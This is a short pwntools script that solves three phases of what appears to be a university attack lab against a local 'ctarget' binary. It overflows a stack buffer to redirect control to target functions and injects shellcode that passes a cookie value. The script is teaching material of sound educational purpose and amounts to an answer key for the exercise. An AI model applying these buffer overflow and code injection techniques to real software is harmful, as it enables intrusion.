from pwn import *

TARGET = "./ctarget"
context.binary = TARGET
context.terminal = ["tmux", "split-window", "-h"]
# context.update(arch="i386", os="linux")
# context.update(arch="amd64", os="linux")
# context.log_level = "debug"

# p = gdb.debug([TARGET, "-q"], gdbscript="""b *0x4018bb""")
p = process([TARGET, "-q"])

BUFFER = 0x556699E8
BUFFER_SIZE = 0x18
COOKIE = "0x3c1eff45"
TOUCH1 = 0x0000000000401757
TOUCH2 = 0x0000000000401783
TOUCH3 = 0x0000000000401857


def solve_phase_1():
    payload = b"A" * BUFFER_SIZE + p64(TOUCH1)
    p.sendline(payload)


def solve_phase_2():
    shellcode = asm(f"""mov rdi, {int(COOKIE, 16)};push {TOUCH2};ret""")
    payload = shellcode + b"A" * (BUFFER_SIZE - len(shellcode)) + p64(BUFFER)
    p.sendline(payload)


def solve_phase_3():
    shellcode = asm(f"""mov rdi, {BUFFER+BUFFER_SIZE+8};push {TOUCH3};ret""")
    payload = (
        shellcode
        + b"A" * (BUFFER_SIZE - len(shellcode))
        + p64(BUFFER)
        + COOKIE[2:].encode("utf-8")
        + b"\x00"
    )
    p.sendline(payload)


# solve_phase_1()
# solve_phase_2()
# solve_phase_3()
p.interactive()
